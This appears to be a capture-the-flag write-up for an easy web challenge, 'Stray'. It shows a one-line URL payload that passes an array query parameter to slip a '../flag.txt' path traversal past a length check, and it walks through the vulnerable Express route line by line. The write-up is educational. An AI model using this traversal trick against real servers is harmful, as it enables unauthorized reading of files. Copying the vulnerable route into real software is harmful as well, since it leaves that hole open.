### Challenge
Name: Stray  
Category: web  
Difficulty: easy  

### Solution
Enter the URL `https://stray.chall.pwnoh.io/cat?category[]=../flag.txt`

### Explanation
Here we exploit the poor type checking in app.js. On line 13 of app.js, the type of category is `string | QueryString.ParsedQs | string[] | QueryString.ParsedQs[] | undefined`. Because the only check is the length of category, we are able to [pass an array](https://stackoverflow.com/questions/6243051/how-to-pass-an-array-within-a-query-string) to the API. JavaScript will also implicitly cast an [array to a string](https://stackoverflow.com/questions/7124884/why-is-1-2-3-4-1-23-4-in-javascript#:~:text=JavaScript's%20%2B%20operator%20has%20two%20purposes,strings%20and%20then%20joining%20them.), omitting brackets.

```javascript
app.get("/cat", (req, res) => {
  let { category } = req.query; // ["../flag.txt"]

  console.log(category);

  if (category.length == 1) { // true, the array has length one
    const filepath = path.resolve("./names/" + category); // implicit cast, so "./names/../flag.txt"
    const lines = fs.readFileSync(filepath, "utf-8").split("\n"); // Reads flags one directory up from names, so ./flag.txt
    const name = lines[Math.floor(Math.random() * lines.length)];

    res.status(200);
    res.send({ name }); // We receive the flag as a response
    return;
  }

  res.status(500);
  res.send({ error: "Unable to generate cat name" });
});
```